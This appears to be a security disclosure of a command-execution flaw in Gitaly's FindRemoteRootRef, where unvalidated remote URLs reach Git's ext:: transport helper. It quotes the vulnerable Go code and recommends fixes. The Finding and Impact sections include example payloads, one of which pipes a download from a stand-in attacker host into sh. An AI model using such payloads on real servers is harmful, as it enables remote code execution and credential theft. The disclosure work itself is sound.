### Title
Unvalidated `RemoteUrl` in `FindRemoteRootRef` allows Git transport-helper command execution via `ext::` (and other unsafe) URL schemes - ([File: internal/gitaly/service/remote/find_remote_root_ref.go])

### Summary
`FindRemoteRootRef` takes the attacker-supplied `RemoteUrl` from the RPC request and writes it verbatim into the `remote.inmemory.url` Git config before running `git remote show inmemory`, with no scheme allowlist anywhere in the call chain. When `ResolvedAddress` is also supplied, the URL is routed through `gitcmd.GetURLAndResolveConfig`, which only special-cases `http://`, `https://`, `git://`, and `ssh://` prefixes; anything else (e.g. `ext::sh -c ...`, `fd::...`) falls into `getURLAndResolveConfigForSCP`, which merely does a naive `strings.SplitN(remoteURL, ":", 2)` and re-emits the URL unmodified in form/semantics — it performs no scheme validation or rejection of dangerous transport helpers.

### Finding Description
`findRemoteRootRefCmd` in `internal/gitaly/service/remote/find_remote_root_ref.go` builds the Git invocation as follows: [1](#0-0) 
- `remoteURL := request.GetRemoteUrl()` is fully attacker-controlled: it originates from GitLab Rails features that let an unprivileged project owner configure a pull/push mirror or perform a repository import by URL. Rails passes this URL to Gitaly through the `FindRemoteRootRef` RPC essentially unmodified.
- If `ResolvedAddress` is present, `gitcmd.GetURLAndResolveConfig(remoteURL, resolvedAddress)` is called: [2](#0-1) 
Only `http(s)://`, `git://`, `ssh://` are special-cased; anything else — critically, Git's `ext::<command>` (and `fd::`) transport-helper syntax — falls through to `getURLAndResolveConfigForSCP`, which performs no scheme rejection, just string-splits on `:`: [3](#0-2) 
- Even when `ResolvedAddress` is empty (so `GetURLAndResolveConfig` is never invoked), the raw, unvalidated `remoteURL` is still placed directly into the Git config used for the remote invocation: [4](#0-3) 
- This config-backed URL is then used to run `git remote show inmemory` via `repo.Exec`: [5](#0-4) 
Git's `ext::` transport helper (`git-remote-ext`) executes an arbitrary shell command supplied in the URL (e.g. `ext::sh -c "id > /tmp/pwned" %S`). Because Gitaly never validates or restricts the URL scheme, and because there is no evidence in the production code path (`internal/git/gitcmd/command_factory.go`, `command_options.go`) of `GIT_ALLOW_PROTOCOL` or `protocol.ext.allow=never` being set — the only occurrence of `GIT_ALLOW_PROTOCOL` in the repository is in test fixtures (`internal/git/gittest/objects.go`), not in the production command factory — Git will happily invoke the `ext` transport helper and execute the attacker's command inside the Gitaly process's environment.

### Impact Explanation
This results in arbitrary command execution on the Gitaly node under the Gitaly service account, achieved solely by an unprivileged user configuring a repository mirror/import URL (e.g. `ext::sh -c "curl attacker.com/x | sh"`). This maps to GitLab's bounty "Remote Code Execution" impact class — full compromise of the Gitaly host, potential lateral access to all repositories and credentials stored on that node, and a critical breakout well beyond the scope of the "SSRF via remote URL" the resolve-config mitigation was designed to address.

### Likelihood Explanation
Feasibility is high and requires no special privileges: any GitLab user who can create/import a project or configure a pull mirror controls the `RemoteUrl` value that reaches Gitaly's `FindRemoteRootRef` RPC. No secret, no admin role, and no race condition is required — this is a straightforward, repeatable exploit each time the mirror/import URL is processed (e.g., during "test connection" / initial mirror sync which invokes `FindRemoteRootRef` to detect the remote HEAD).

### Recommendation
Reject remote URLs whose scheme is anything other than an explicit allowlist (`http`, `https`, `git`, `ssh`, and scp-like syntax) before ever constructing the Git command/config; explicitly refuse `ext::`, `fd::`, and any other Git "remote helper" style prefixes (`<scheme>::`). Additionally/defensively, set `GIT_ALLOW_PROTOCOL=http:https:git:ssh` (or the corresponding `protocol.*.allow` config) for all internally-spawned Git commands that consume externally supplied URLs, and specifically disable `protocol.ext.allow` and `protocol.fd.allow` process-wide in the Gitaly Git command factory, not just in test helpers.

func (s *server) findRemoteRootRefCmd(ctx context.Context, request *gitalypb.FindRemoteRootRefRequest) (*command.Command, error) {
	remoteURL := request.GetRemoteUrl()
	var config []gitcmd.ConfigPair

	if resolvedAddress := request.GetResolvedAddress(); resolvedAddress != "" {
		modifiedURL, resolveConfig, err := gitcmd.GetURLAndResolveConfig(remoteURL, resolvedAddress)
		if err != nil {
			return nil, structerr.NewInvalidArgument("couldn't get curloptResolve config: %w", err)
		}

		remoteURL = modifiedURL
		config = append(config, resolveConfig...)
	}

	config = append(config, gitcmd.ConfigPair{Key: "remote.inmemory.url", Value: remoteURL})

func getURLAndResolveConfigForSCP(remoteURL, resolvedAddress string) (string, []ConfigPair, error) {
	hostAndPath := strings.SplitN(remoteURL, ":", 2)
	if len(hostAndPath) != 2 {
		return "", nil, fmt.Errorf("invalid protocol/URL encountered: %s", remoteURL)
	}

	if strings.Contains(hostAndPath[0], "/") {
		return "", nil, fmt.Errorf("SSH URLs with '/' before colon are unsupported")
	}

	var userPrefix string

	if userAndHost := strings.SplitAfterN(remoteURL, "@", 2); len(userAndHost) > 1 {
		userPrefix = userAndHost[0]
	}

	return fmt.Sprintf("%s%s:%s", userPrefix, resolvedAddress, hostAndPath[1]), nil, nil
}
